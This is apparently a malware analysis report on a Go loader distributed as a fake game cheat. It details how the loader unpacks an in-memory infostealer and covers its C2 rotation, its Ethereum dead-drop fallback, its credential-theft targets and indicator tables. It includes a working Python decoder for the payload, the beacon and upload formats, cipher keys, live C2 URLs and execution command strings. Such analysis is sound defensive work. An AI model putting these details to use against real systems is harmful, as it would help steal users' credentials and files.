# Go loader that maps an in-memory infostealer with three hardcoded C2 servers and an Ethereum fallback

## Key findings

- A self-signed Go loader in a fake game-cheat archive hooks `GetUserNameA`, decodes a native stealer from its own `.rdata` and maps it into its own process.
- Every captured beacon and upload is plain HTTP with a forged `Host: github.com` header.
- The stealer decrypts three hardcoded C2 URLs with ChaCha20 and tries them in order, then falls back to an address stored in an Ethereum contract.
- A captured upload decrypts without any secret: each is an LZ4-compressed, ChaCha20-encrypted archive that carries its own key.

```
ZIP on MediaFire (links in YouTube videos, password 3393)
 └─ Loader.exe  stage 1, Go 1.22.1 PE32+, 9,860,512 B, self-signed "Harbor Signal Labs"
     ├─ inline hook advapi32!GetUserNameA -> always returns "SLPrwy"
     ├─ decode 322,257-byte blob (five index-keyed passes, K = 0xd8c30)
     └─ map stage 2 (233,472 B) RWX at 0x140000000, call entry 0x1400020a0
         ├─ crypter check: dialog only if the raw stage 2 runs from disk (inferred)
         ├─ C2 order: teculse.click -> kipthen.shop -> fuarnpp.shop -> eth_call fallback
         ├─ beacon: POST tag/exp/hwid, 89 B, Host: github.com, Chrome/117 UA
         ├─ reply: key[32] || nonce[8] || ChaCha20(data); "vm": true enables a CPUID check
         └─ upload: multipart type 0/1/2, ChaCha20(LZ4(archive)) || key || nonce -> exit 0
```

## 1. Distribution

`GalaxyPr00j33ct2.69v.zip` (24,517,835 B) is a ZipCrypto-encrypted archive on MediaFire, linked from 13 YouTube videos on one channel. Twelve use MediaFire key `jvkwo4x0tmm184z` and give the password `3393`, which opens it; one uses a second key, `fl6z8te6mflwi1p`, and gives no password. Of its 321 files, `Loader.exe` is the only PE and the only file dated 2026-09-17, the signing day. The other 320 files, all dated 2026-07-10, are filler: 284 XML files of random dictionary words in random-named folders, Exeinfo PE support files, and a `key.txt` lure ("ur key - ODUWEUDXFQZYBMHB just run .exe and send this key in this aplication").

## 2. Stage 1: Go loader

| Field | Value |
|---|---|
| File | SHA-256 of file 18e5bcc1e2953972f9d362679262495edce1ccf03975411c3ee534d3c7f37a7c, 9,860,512 B |
| Format | PE32+ x64 GUI, TimeDateStamp 0, 47 kernel32.dll imports (Go runtime set) |
| Build | Go 1.22.1, module path `tl5wOpGOi75xjG0`, `-trimpath=true`, `CGO_ENABLED=0`; random function names such as `main.jJYqd` |
| Signature | Authenticode, self-signed `C=US, O=Harbor Signal Labs, CN=Harbor Signal Labs`, RSA-4096, serial `5f:f1:9c:68:cf:23:09:85:3f:89:cf:58:0f:8c:90:bb`; DigiCert PKCS #9 countersignature (not RFC 3161), signingTime 2026-09-17 05:33:42Z |

The certificate is valid from 2026-09-10 05:33:41Z to 2027-09-17 05:33:41Z. notBefore is exactly 7 days and 1 s before the timestamp, and the validity is 372 days. The certificate was most likely created at signing time with a backdated notBefore (inferred). Only the timestamp is attested by a third party.

### 2.1 `GetUserNameA` hook

`main.main` (0x516ca0) first calls `main.QQMCXmZw56M` (0x827940, call at 0x517a82). That function resolves `advapi32!GetUserNameA`, calls `VirtualProtect(addr, 14, PAGE_EXECUTE_READWRITE)` (0x832104) and writes a 14-byte absolute-jump trampoline (`FF 25 00000000` plus an 8-byte target). The target is a `syscall.NewCallback` thunk over `main.QQMCXmZw56M.func1`, which copies `SLPrwy` into the buffer, sets `*pcbBuffer = 7` and returns TRUE. Stage 2 calls the API once (0x14001f98f) for the profile's `user-name`, and every captured upload reported `user-name: SLPrwy` regardless of the real account.

### 2.2 Stage-2 decoder

The encrypted stage is 322,257 bytes: the byte 0x55 from an immediate at 0x51bff1, then 322,256 bytes from `.rdata` VA 0xbe28a9 (file offset 0x7e16a9). `main.jJYqd` (0x814480) decrypts it in five passes driven by one immediate, K = 0xd8c30 (0x51c038). There is no compression and no other key. This reimplementation reproduces the stage-2 hash byte for byte:

```python
def decode_stage2(blob: bytes, K: int = 0xd8c30) -> bytes:
    b = bytearray(blob)
    for i in range(len(b)):                        # pass A (0x81a5a3 / 0x81a5ea)
        if i % 2 == 0:
            b[i] = (b[i] - (K % 53) - 17 * i) & 0xFF
        else:
            b[i] ^= ((K % 97) ^ (31 * i)) & 0xFF
    b.reverse()                                    # pass B (0x81b449)
    for i in range(0, len(b) - 1, 2):              # pass C (0x81c2a5): swap pairs
        b[i], b[i + 1] = b[i + 1], b[i]
    for i in range(len(b)):                        # pass D (0x81d0f5)
        b[i] = (b[i] - 3 * i - ((K >> 8) & 0xFF)) & 0xFF
    for i in range(len(b)):                        # pass E (0x81df2d)
        b[i] ^= ((5 * i) & 0xFF) ^ (K & 0xFF)
    return bytes(b)

# blob = b"\x55" + loader[0x7e16a9:0x7e16a9 + 322256]
# stage 2 = decode_stage2(blob)[:233472]   (K % 53 = 0, K % 97 = 0x0F)
```

The 88,785 bytes after the PE decode to random ASCII letters (A-Z, a-z only). Because file byte 0x7e16a8 is also 0x55, the blob is the contiguous range 0x7e16a8 to 0x7e16a8 + 322,257.

### 2.3 Mapping

The loader calls `VirtualAlloc(0x140000000, 0x3d000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` and copies the headers and four sections. Relocation and import fix-up follow, then the call into stage 2 through `syscall.SyscallN` (0x533620).

## 3. Stage 2

| Field | Value |
|---|---|
| Payload | SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795, 233,472 B, never written to disk |
| Format | PE32+ x64 GUI, base 0x140000000, entry RVA 0x20a0, TimeDateStamp 2026-09-16 22:57:46 UTC; sections `.text`, `.rdata`, `.data`, `.reloc`; no exception, TLS or resource directory |
| Imports | 39 functions from KERNEL32, ADVAPI32, USER32, GDI32, ole32 and OLEAUT32 (screen capture, WMI); imphash 27742d1bf6f86ef7fe780b678bfbbfbf |
| Build strings | build date `17.09.2026` (0x140033690); build ID (0x140033c4c), sent as the beacon `tag` |

The build ID, grouped here for readability, is `5a4378fb 90db39f0 9c7b18d1 f314e645`.

### 3.1 Start-up, API resolution and strings

The entry point runs this chain, then `ExitProcess(0)`:

1. 0x14002d160 builds the syscall table.
2. 0x14002a0d0, a check; nonzero exits.
3. 0x140028bb0, the crypter check (section 7); 0 exits.
4. 0x1400048a0, ChaCha20 setup for the C2 table; 0 exits.
5. 0x140006870, the main routine.

`start` resolves `LoadLibraryExW` by hash (0x1400020c9). Apart from the 39 static imports, every other API comes from export walks in `sub_14002DDF0`, hashed with reflected CRC-32 (polynomial 0xEDB88320, initial value 0x96577E78, final NOT) over the plain export name. Five known pairs check out, for example `NtDelayExecution` = 0x57F80510. 69 APIs resolve this way, including 14 WinHTTP calls.

Native calls use direct syscalls. The table builder scans each `Nt*` export for `4c 8b d1 b8` (`mov r10, rcx; mov eax, SSN`) and stores one {hash, SSN} pair per matching stub at 0x14003a198 (478 on Windows Server 2022). The gate 0x14002d120 holds the image's only `syscall` instruction (0x14002d153) and has 141 call sites.

Strings are decoded in place from stack or `.rdata`: `el[j] ^= ((j + 1) * K) mod 2^(8w)`, element width w of 1, 2 or 4 bytes, K per string.

## 4. C2 selection

The state byte at 0x140035018 starts at 0xFA and selects the endpoint:

| State | Source | Endpoint |
|---|---|---|
| 0xFA | table entry 0 (0x140032520) | `http://teculse.click:9210/permissions` |
| 0xFB | table entry 1 (0x140032560) | `http://kipthen.shop:9932/settings` |
| 0xF8 | table entry 2 (0x1400325a0) | `http://fuarnpp.shop:5627/permissions` |
| 0xF9 | Ethereum contract | value read with `eth_call` |
| 0xFE | none | gives up |

Each 64-byte entry is decrypted with original (DJB) ChaCha20: 64-bit counter, 8-byte nonce, block counter equal to the entry index.

The send loop `sub_140005590` treats HTTP 200 to 299 and 405 as success. 403 aborts the sequence, and 500 moves to the next endpoint at once. Other statuses are retried up to 5 times with a 5.0 s sleep. Live runs confirmed the 500 rotation. With replies of 500, 500 and 200, the sample beaconed to all three endpoints in order within 0.6 s. With nothing listening, it sent its first SYN to each endpoint at 1.25 s, 40.1 s and 85.0 s and was still running at 91 s.

Ethereum fallback (static). Stage 2 POSTs this body to `https://ethereum-rpc.publicnode.com` with `Content-Type: application/json`:

`{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"0x999941b74F6bbc921D5174A5b29911562cd2D7CF","data":"0xc2fb26a6"},"latest"]}`

It decodes the last 64 hex characters of `"result"` into the C2 slot at 0x14003a110, with no further decryption. In effect, the last ABI word of the returned string is the URL (inferred).

## 5. C2 protocol

### 5.1 Beacon

Captured live, identical on all three endpoints apart from the path:

```
POST /permissions HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Host: github.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Length: 89

tag=<build ID>&exp=<decimal>&hwid=<32 hex>
```

TCP goes to the C2 host; only the header names GitHub. This is Host-header forgery, not domain fronting.

- `exp`: 0x6AAB2D80 (2026-09-17 00:00:00 UTC) plus a 16-bit MT19937 output seeded from `KUSER_SHARED_DATA.SystemTime`. It is the build day plus up to 65,535 s of jitter, not a run timestamp.
- `hwid`: four 32-bit words seeded with CRC-variant hashes of SMBIOS Type 1 Manufacturer, ProductName, UUID and SerialNumber, mixed with CPU and RAM product-name hashes, scrambled and printed `%08x` four times. It holds no user or computer name.

### 5.2 Reply

`sub_140007C40` treats a successful reply as `key[32] || nonce[8] || ChaCha20(data)` (static). It allocates `len - 39` bytes with no length check. The reply length alone decides the outcome:

| Reply body | Outcome |
|---|---|
| 38 B or less | beacon only, exit code 2 |
| 39 B | beacon only; behaviour varies between runs |
| 40 B or more | beacon, type-0 upload, exit code 0 within 299 to 675 ms |

A sinkhole that answers with 38 bytes or less therefore stops the upload. The decrypted reply is parsed as JSON; statically, a `"vm": true` key enables the CPUID check (section 7).

### 5.3 Upload

Captured live and decrypted:

- `POST` to the same URL, `multipart/form-data`, random alphanumeric boundary.
- Fields: `access_token` (empty), `type` (0 to 2), and `file` with filename `data` and `Content-Type: application/octet-stream`.
- `file` = `ChaCha20(LZ4_block(archive)) || key[32] || nonce[8]`, counter 0, key and nonce generated at run time.
- Archive entries: `[u16 name length incl. NUL][name\0][u32 length][content]`.

The key travels with the data, so any captured upload decrypts without server material. Live type-0 uploads (926 and 950 B bodies) held one entry, `Info.yml`, with these keys:

- `build`: `date`, `tag`, `path`, `elevated`, `ip-address`, `country`, `time`
- `os`: `version`, `time-zone`, `local-date`, `install-date`, `language`, `computer-name`, `user-name`, `netbios`, `domain`, `hostname`, `anti-virus`
- `hardware`: `motherboard`, `cpu`, `ram`, `gpu`, `display`

The client sends `tag: {tag}`, `ip-address: {ip}`, `country: {country}` and `time: {time}` as literal placeholders.

Static only: `sub_140006100` (21 call sites) builds a second urlencoded POST with fields `access_token=` and `&debug=`. Bodies of 2 MiB or more switch to a chunked URL form with `-chunk-` and `-s` suffixes.

## 6. Collection

Upload types are exactly 0, 1 and 2, across nine call sites.

- Type 0 (seven sites): the `Info.yml` profile, plus screenshot (`CreateDesktopW`, `BitBlt`, `GetDIBits`), registry and file collectors.
- Type 1 (`sub_140009380`): reaches `CryptUnprotectData`, the `NCryptOpenStorageProvider`/`NCryptDecrypt` chain, process-memory syscalls and `CreateProcessW`. Browser credential and key theft is inferred.
- Type 2 (`sub_14000A210`): reaches only `NtQueryDirectoryFile` and `NtCreateFile`. A file grabber is inferred.

Decoded target strings (found decoded in the image):

| Category | Strings |
|---|---|
| Chromium | `\Login Data`, `\Web Data`, `\Network\Cookies`, `\Local Storage\leveldb`, `\IndexedDB\chrome-extension_` |
| Gecko | `\key4.db`, `logins.json`, `cookies.sqlite`, `formhistory.sqlite`, `\moz-extension+++` |
| Games | `\REGISTRY\MACHINE\SOFTWARE\Valve\Steam`, `\config\config.vdf`, `%LocalAppData%\Roblox\LocalStorage\RobloxCookies.dat`, `Applications/Roblox/Cookies.txt` |
| Mail | `%UserProfile%\Documents\Outlook Files`, `*.pst` |
| Host | WMI `ROOT\SecurityCenter2` `SELECT * FROM AntiVirusProduct`, `Processes.txt` |
| Execution | `powershell -exec bypass -f "`, `msiexec.exe /i "`, `rundll32 "`, `__COMPAT_LAYER=RunAsInvoker`; `.lnk`, `.exe`, `.dll`, `.msi` and `.sys`, five separate strings built in 0x140016270 |

The execution strings suggest a next-stage launcher (inferred).

## 7. Anti-analysis

Crypter check (`0x140028bb0`). A `.rdata` struct at 0x140033ae0 holds `e0 20 03 00 24 85 85 77` (its own file offset 0x320e0, then the marker) and their standard CRC-32, 0xefe0d8a9; a mismatch exits. The check opens the process image file named in `PEB->ProcessParameters->ImagePathName`. Only if `24 85 85 77` sits at file offset 0x320e4 does it raise `NtRaiseHardError(0x50000018)` by direct syscall: text `CANCEL THE RUN TO PREVENT MALWARE FROM EXECUTING`, buttons OK and Cancel. OK continues; anything else exits 0. The marker is present in the raw stage 2 and absent from `Loader.exe`, so the dialog appears only when the unpacked payload runs from disk (inferred from code and bytes). Run on its own from disk, stage 2 raised the hard error and sent no beacon.

CPUID check (`sub_140029CC0`, called once from 0x140006e75). A hit is CPUID leaf 1 ECX bit 31, or a leaf 0x40000000 vendor of `VMKV`, `CGTC`, `reVM`, `VBox` or `MMXe`. Statically, the check runs only when the parsed reply holds `"vm": true` (key decoded at 0x140006ef5). A hit sets `r14d = 1`; the test at 0x140007bdd then returns 0 from main before the next upload call (0x140003b30), and the process exits 0. That the parsed buffer is the C2 reply is inferred from data flow.

## 8. Contract and infrastructure

Contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF (Ethereum mainnet, 2,353 B runtime code) has two getters, `0xc2fb26a6` and `0x57de26a4`, which return the same string. Owner 0xbecfc3f9eb36e6ec0e54f7a6627da7ef648f8f01 writes it through setter `0xebaac771`, and each write emits one log, so `eth_getLogs` shows rotations.

| Set (UTC) | Block | Value |
|---|---|---|
| 2026-02-25 15:35:11 | 24,534,859 | `example.com` (deployment) |
| 2026-02-25 15:56:47 | 24,534,964 | `blablatst12345.net` |
| 2026-02-25 16:43:11 | 24,535,195 | `chalx.live:5902` |
| 2026-03-01 19:44:59 | 24,564,769 | `http://chalx.live:5902` |
| 2026-04-25 22:57:47 | 24,960,152 | `http://fightwa.biz:5902` |
| 2026-09-24 21:17:47 | 26,049,944 | `http://fforket.shop:2958` |
| 2026-09-24 22:15:47 | 26,050,230 | `http://heaucts.click:4529` |
| 2026-09-28 14:57:47 | 26,076,698 | `http://ventuxe.biz:6929` |
| 2026-10-21, 18:07 to 21:07 | not recorded | `http://24hocst.help:2538` |
| 2026-10-26, 09:07 to 12:07 | not recorded | `https://bl4ckyhills.com` |

The last two times are windows between three-hourly reads; each change came with one more owner transaction. `https://bl4ckyhills.com` was still the value at the last read, 2026-11-05 21:07 UTC (block 26,351,217), with no further owner transaction. It breaks the `http://host:port` pattern.

The same owner created a second contract, 0xf6896c4ddd2b821d5d2b3c18459acd9b5ec1ce21, on 2026-02-25 18:13:59 UTC. Its runtime code is identical, both getters return `localhost2`, and it was never written again.

Domains (RDAP and public DNS on 2026-10-07; all registered at Dynadot):

| Domain | Created | State on 2026-10-07 |
|---|---|---|
| `teculse.click` | 2026-09-01 | 75.148.178.13 (Comcast) |
| `kipthen.shop` | 2026-09-10 18:51:17Z | 147.182.203.222 (DigitalOcean) |
| `fuarnpp.shop` | 2026-09-10 18:51:19Z | `serverHold`, last change 2026-09-23; NXDOMAIN |
| `fforket.shop` | 2026-09-10 18:51:19Z | 147.182.132.149 (DigitalOcean) |
| `heaucts.click` | 2026-09-13 | `serverHold`, last change 2026-09-28 10:05:57Z, about 5 h before the contract moved off it; NXDOMAIN |
| `ventuxe.biz` | 2026-09-26 | 137.184.108.14 (DigitalOcean) |

Public DNS on 2026-10-27 at 18:18 UTC: `fightwa.biz` still resolved to 167.99.67.141 (DigitalOcean), a month after it left the contract, and `24hocst.help` resolved to 159.223.150.218 (DigitalOcean). Both use Dynadot's `dyna-ns.net` name servers. `bl4ckyhills.com` resolved to Cloudflare addresses (104.21.50.99, 172.67.204.28) with Cloudflare name servers.

On 2026-10-07 at 07:20 to 07:21 UTC, `teculse.click:9210`, `kipthen.shop:9932` and `ventuxe.biz:6929` accepted TCP connections. An HTTP `GET /` to each, answered from 75.148.178.13, 147.182.203.222 and 137.184.108.14, returned 200 with byte-identical 896-byte bodies, an nginx welcome page (`Server: nginx`).

## 9. Crypto material

| Value | Bytes | Location |
|---|---|---|
| Stage-1 cipher constant | K = 0xd8c30 | `main.main` 0x51c038 |
| ChaCha20 key, C2 table | `f7 c2 b7 77 e9 5f 0f d6 6e 10 64 94 ce 9d 2b ca ca 05 2d b3 73 e6 85 72 c9 c9 06 5f ba b2 2d dc` | stage 2 VA 0x1400324f0 |
| ChaCha20 nonce, C2 table | `b0 8a 0d 25 69 c7 80 00` | stage 2 VA 0x140032510 |
| Upload and reply keys | carried in the message: last 40 B of an upload, first 40 B of a reply | none static |
| API hash | CRC-32, polynomial 0xEDB88320 (built as 0xB706EBD5 ^ 0x5ABE68F5), initial value 0x96577E78, final NOT | `sub_14002DDF0` |
| hwid scramble | multiply 0xA814B126 (0x0798BA73 ^ 0xAF8C0B55), add 0xC516E475 (0x88D56173 ^ 0x4DC38506); only the halves occur in the image | `sub_14001ED10` |
| Crypter struct | `e0 20 03 00 24 85 85 77`, standard CRC-32 of these 8 bytes 0xefe0d8a9 | stage 2 0x140033ae0 (file offset 0x320e0) |

## 10. Scope and method

- **Samples:** one stage-1 sample, its in-memory second stage, one distribution archive, two Ethereum contracts from one owner
- **Methods:** static analysis; emulation of the loader (2026-09-19); contained lab runs against a local C2 responder (2026-09-28, 2026-10-07)
- **Live checks:** TCP and HTTP `GET /` probes of three C2 ports (2026-10-07); RDAP and public DNS (2026-10-07, 2026-10-27); read-only chain reads (2026-10-07 to 2026-11-05)
- **Coverage:** Lab runs against a local C2 responder cover the beacon, endpoint rotation, reply handling, the type-0 `Info.yml` upload and the `user-name` value that the `GetUserNameA` hook forces. The collectors, upload types 1 and 2, the Ethereum fallback and the CPUID check are read from code.

## Indicators

### Malicious

| IOC | Type | Value | Context |
|---|---|---|---|
| Stage 1 loader | SHA-256 | 18e5bcc1e2953972f9d362679262495edce1ccf03975411c3ee534d3c7f37a7c | `Loader.exe`, Go stage-1 loader, 9,860,512 B; SHA-256 of file 18e5bcc1e2953972f9d362679262495edce1ccf03975411c3ee534d3c7f37a7c |
| Stage 2 stealer | SHA-256 (payload) | 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795 | Stage 2 decrypted in memory by `Loader.exe` (SHA-256 of file 18e5bcc1e2953972f9d362679262495edce1ccf03975411c3ee534d3c7f37a7c); SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795 |
| Archive | SHA-256 | 2075139171a06161c8244f8797ea6c59a81c7694694b2e0f016b8c791efbdbca | `GalaxyPr00j33ct2.69v.zip`, ZipCrypto archive that contains `Loader.exe`; SHA-256 of file 2075139171a06161c8244f8797ea6c59a81c7694694b2e0f016b8c791efbdbca |
| Download | URL | https://www.mediafire.com/file/jvkwo4x0tmm184z/GalaxyPr00j33ct2.69v.zip/file | Serves `GalaxyPr00j33ct2.69v.zip` (SHA-256 of file 2075139171a06161c8244f8797ea6c59a81c7694694b2e0f016b8c791efbdbca); linked from 12 videos with the password |
| Download | URL | https://www.mediafire.com/file/fl6z8te6mflwi1p/GalaxyPr00j33ct2.69v.zip/file | Served `GalaxyPr00j33ct2.69v.zip` (SHA-256 of file 2075139171a06161c8244f8797ea6c59a81c7694694b2e0f016b8c791efbdbca) on 2026-09-17; linked from one video without the password |
| Signing certificate | Certificate SHA-256 | D2:70:AF:34:EC:82:7F:92:EB:E5:44:47:19:B6:5F:C0:E6:EF:B4:AA:12:FA:AC:C6:DD:09:73:2D:60:FE:AD:5D | Self-signed "Harbor Signal Labs" certificate that signs `Loader.exe` (SHA-256 of file 18e5bcc1e2953972f9d362679262495edce1ccf03975411c3ee534d3c7f37a7c) |
| Stage 2 stealer | Imphash | 27742d1bf6f86ef7fe780b678bfbbfbf | Imphash of the stage 2 payload, SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795 |
| Beacon tag | Build ID | `5a4378fb90db39f09c7b18d1f314e645` | Build ID in the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), sent as the `tag` field |
| C2 | URL | http://teculse.click:9210/permissions | C2 that the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) tries first |
| C2 | URL | http://kipthen.shop:9932/settings | C2 that the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) tries second |
| C2 | URL | http://fuarnpp.shop:5627/permissions | C2 that the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) tries third; domain on `serverHold` with NXDOMAIN on 2026-10-07 |
| Dead-drop contract | Ethereum contract | 0x999941b74F6bbc921D5174A5b29911562cd2D7CF | Dead drop that the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) reads with `eth_call` as its fallback C2 |
| Contract owner | Ethereum address | 0xbecfc3f9eb36e6ec0e54f7a6627da7ef648f8f01 | Owner that made every value change of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, the dead drop of the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://24hocst.help:2538 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-10-21 between 18:07 and 21:07 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://ventuxe.biz:6929 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-09-28 14:57:47 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://heaucts.click:4529 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-09-24 22:15:47 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://fforket.shop:2958 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-09-24 21:17:47 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://fightwa.biz:5902 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-04-25 22:57:47 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |
| Fallback C2 | URL | http://chalx.live:5902 | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF, set 2026-03-01 19:44:59 UTC; contract read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795) |

### Suspicious

| IOC | Type | Value | Context |
|---|---|---|---|
| Contract value | URL | https://bl4ckyhills.com | Value of contract 0x999941b74F6bbc921D5174A5b29911562cd2D7CF since 2026-10-26, read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795); an `https` URL without a port, unlike the earlier values |
| Resolved address | IPv4 | 75.148.178.13 | A record of `teculse.click`, the first C2 of the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-07; accepted TCP on port 9210 that day; Comcast |
| Resolved address | IPv4 | 147.182.203.222 | A record of `kipthen.shop`, the second C2 of the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-07; accepted TCP on port 9932 that day; DigitalOcean |
| Resolved address | IPv4 | 147.182.132.149 | A record of `fforket.shop`, a contract value read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-07; DigitalOcean |
| Resolved address | IPv4 | 137.184.108.14 | A record of `ventuxe.biz`, a contract value read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-07; accepted TCP on port 6929 that day; DigitalOcean |
| Resolved address | IPv4 | 159.223.150.218 | A record of `24hocst.help`, a contract value read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-27; DigitalOcean |
| Resolved address | IPv4 | 167.99.67.141 | A record of `fightwa.biz`, a contract value read by the stage 2 payload (SHA-256 of payload 000072875132245f92df27fe777c00ffe3ae310a7e52fd20ad826c31b1e69795), on 2026-10-27; DigitalOcean |
